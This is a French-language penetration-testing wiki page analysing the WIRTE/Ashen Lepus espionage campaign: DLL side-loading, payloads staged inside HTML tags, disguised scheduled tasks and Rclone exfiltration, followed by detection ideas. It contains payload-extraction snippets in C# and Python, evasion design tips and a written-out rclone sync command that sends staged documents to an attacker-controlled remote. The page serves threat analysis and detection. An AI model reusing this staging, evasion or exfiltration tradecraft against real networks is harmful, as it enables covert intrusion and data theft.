# DLL Side-Loading avancé avec HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu de la tradecraft

Ashen Lepus (aka WIRTE) a exploité un schéma répétable qui enchaîne DLL sideloading, staged HTML payloads et backdoors .NET modulaires pour persister au sein de réseaux diplomatiques du Moyen-Orient. La technique est réutilisable par n'importe quel opérateur car elle repose sur :

- **Archive-based social engineering**: des PDF apparemment bénins instruisent les cibles de récupérer une archive RAR depuis un site de partage de fichiers. L'archive contient un visualiseur de documents EXE réaliste, une DLL malveillante nommée d'après une bibliothèque de confiance (par ex. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), et un leurre `Document.pdf`.
- **DLL search order abuse**: la victime double-clique sur l'EXE, Windows résout l'import de la DLL depuis le répertoire courant, et le loader malveillant (AshenLoader) s'exécute dans le processus de confiance pendant que le PDF leurre s'ouvre pour éviter les soupçons.
- **Living-off-the-land staging**: chaque étape ultérieure (AshenStager → AshenOrchestrator → modules) est maintenue hors du disque jusqu'à ce qu'elle soit nécessaire, fournie sous forme de blobs chiffrés cachés à l'intérieur de réponses HTML par ailleurs inoffensives.

## Chaîne de side-loading multi-étapes

1. **Decoy EXE → AshenLoader**: l'EXE leurre side-load AshenLoader, qui effectue la reconnaissance de l'hôte, le chiffre en AES-CTR, puis l'envoie via POST en l'encapsulant dans des paramètres rotatifs tels que `token=`, `id=`, `q=` ou `auth=` vers des chemins ressemblant à des API (par ex. `/api/v2/account`).
2. **HTML extraction**: le C2 ne révèle la prochaine étape que lorsque l'IP client géolocalise dans la région cible et que le `User-Agent` correspond à l'implant, ce qui contrecape les sandboxes. Lorsque les contrôles sont passés, le corps HTTP contient un blob `<headerp>...</headerp>` avec le payload AshenStager chiffré en Base64/AES-CTR.
3. **Second sideload**: AshenStager est déployé avec un autre binaire légitime qui importe `wtsapi32.dll`. La copie malveillante injectée dans le binaire récupère plus de HTML, cette fois en extrayant `<article>...</article>` pour récupérer AshenOrchestrator.
4. **AshenOrchestrator**: un contrôleur .NET modulaire qui décode une config JSON en Base64. Les champs `tg` et `au` de la config sont concaténés/hashés pour former la clé AES, qui déchiffre `xrk`. Les octets résultants servent de clé XOR pour chaque blob de module récupéré ensuite.
5. **Module delivery**: chaque module est décrit via des commentaires HTML qui redirigent le parseur vers une balise arbitraire, contournant les règles statiques qui ne recherchent que `<headerp>` ou `<article>`. Les modules incluent la persistance (`PR*`), les désinstalleurs (`UN*`), la reconnaissance (`SN`), la capture d'écran (`SCT`) et l'exploration de fichiers (`FE`).

### Modèle d'analyse du conteneur HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Même si les défenseurs bloquent ou suppriment un élément spécifique, l'opérateur n'a qu'à changer la balise indiquée dans le commentaire HTML pour reprendre la livraison.

### Assistant d'extraction rapide (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallèles d'évasion du staging HTML

Des recherches récentes sur HTML smuggling (Talos) mettent en évidence des payloads cachés sous forme de chaînes Base64 à l'intérieur de blocs `<script>` dans des pièces jointes HTML et décodés via JavaScript à l'exécution. Le même trick peut être réutilisé pour les réponses C2 : stage des blobs chiffrés inside une balise script (ou autre élément DOM) et les décoder en mémoire avant AES/XOR, faisant en sorte que la page ressemble à du HTML ordinaire. Talos montre aussi une obfuscation en couches (renommage d'identifiants plus Base64/Caesar/AES) à l'intérieur des balises script, ce qui se transpose proprement aux blobs C2 HTML-staged.

## Notes sur les variantes récentes (2024-2025)

- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.

## Durcissement de la crypto et du C2

- **AES-CTR everywhere** : les loaders actuels intègrent des clés 256-bit ainsi que des nonces (p.ex., `{9a 20 51 98 ...}`) et ajoutent éventuellement une couche XOR en utilisant des chaînes telles que `msasn1.dll` avant/après le décryptage.
- **Variations du matériel clé** : les loaders antérieurs utilisaient Base64 + TEA pour protéger les chaînes intégrées, la clé de déchiffrement étant dérivée du nom du DLL malveillant (p.ex., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage** : les serveurs de staging sont séparés par outil, hébergés sur différents ASNs, et parfois masqués par des sous-domaines à l'apparence légitime, de sorte que la compromission d'une étape n'expose pas le reste.
- **Recon smuggling** : les données énumérées incluent désormais les listings de Program Files pour repérer les applications à haute valeur et sont toujours chiffrées avant de quitter l'hôte.
- **URI churn** : les paramètres de requête et les chemins REST tournent entre les campagnes (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidant les détections fragiles.
- **User-Agent pinning + safe redirects** : l'infrastructure C2 ne répond qu'aux chaînes UA exactes et, dans les autres cas, redirige vers des sites d'actualité/santé bénins pour se fondre dans le trafic.
- **Gated delivery** : les serveurs sont géo-restreints et ne répondent qu'aux implants réels. Les clients non autorisés reçoivent du HTML non suspect.

## Persistance et boucle d'exécution

AshenStager dépose des tâches planifiées qui se font passer pour des jobs de maintenance Windows et s'exécutent via `svchost.exe`, e.g. :

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ces tâches relancent la chaîne de sideloading au démarrage ou à intervalles réguliers, permettant à AshenOrchestrator de demander de nouveaux modules sans toucher au disque à nouveau.

## Utilisation de clients de synchronisation bénins pour l'exfiltration

Les opérateurs stage des documents diplomatiques dans `C:\Users\Public` (accessible à tous et non suspect) via un module dédié, puis téléchargent le binaire légitime de [Rclone](https://rclone.org/) pour synchroniser ce répertoire avec un stockage contrôlé par l'attaquant. Unit42 note que c'est la première fois que cet acteur a été observé en train d'utiliser Rclone pour l'exfiltration, ce qui s'aligne sur la tendance plus large d'abuser d'outils de synchronisation légitimes pour se fondre dans le trafic normal :

1. **Stage** : copier/collecter les fichiers ciblés dans `C:\Users\Public\{campaign}\`.
2. **Configure** : fournir un fichier de config Rclone pointant vers un endpoint HTTPS contrôlé par l'attaquant (p.ex., `api.technology-system[.]com`).
3. **Sync** : exécuter `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` afin que le trafic ressemble à des sauvegardes cloud normales.

Parce que Rclone est largement utilisé pour des workflows de sauvegarde légitimes, les défenseurs doivent se concentrer sur les exécutions anormales (nouveaux binaires, remotes étranges, ou synchronisations soudaines de `C:\Users\Public`).

## Axes de détection

- Alerter sur les processus signés qui chargent de manière inattendue des DLLs depuis des chemins modifiables par l'utilisateur (filtres Procmon + `Get-ProcessMitigation -Module`), surtout lorsque les noms des DLL correspondent à `netutils`, `srvcli`, `dwampi`, ou `wtsapi32`.
- Inspecter les réponses HTTPS suspectes pour des **gros blobs Base64 intégrés dans des balises inhabituelles** ou protégés par des commentaires `<!-- TAG: <xyz> -->`.
- Étendre la chasse HTML aux **chaînes Base64 à l'intérieur de blocs `<script>`** (staging à la manière d'HTML smuggling) qui sont décodées via JavaScript avant le traitement AES/XOR.
- Rechercher des **tâches planifiées** qui exécutent `svchost.exe` avec des arguments non liés aux services ou qui renvoient aux répertoires du dropper.
- Suivre les **C2 redirects** qui ne renvoient des payloads que pour des chaînes `User-Agent` exactes et qui, dans les autres cas, redirigent vers des domaines d'actualité/santé légitimes.
- Surveiller l'apparition de binaires **Rclone** en dehors des emplacements gérés par le service IT, de nouveaux fichiers `rclone.conf`, ou des tâches de sync effectuant des pulls depuis des répertoires de staging comme `C:\Users\Public`.

## Références

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
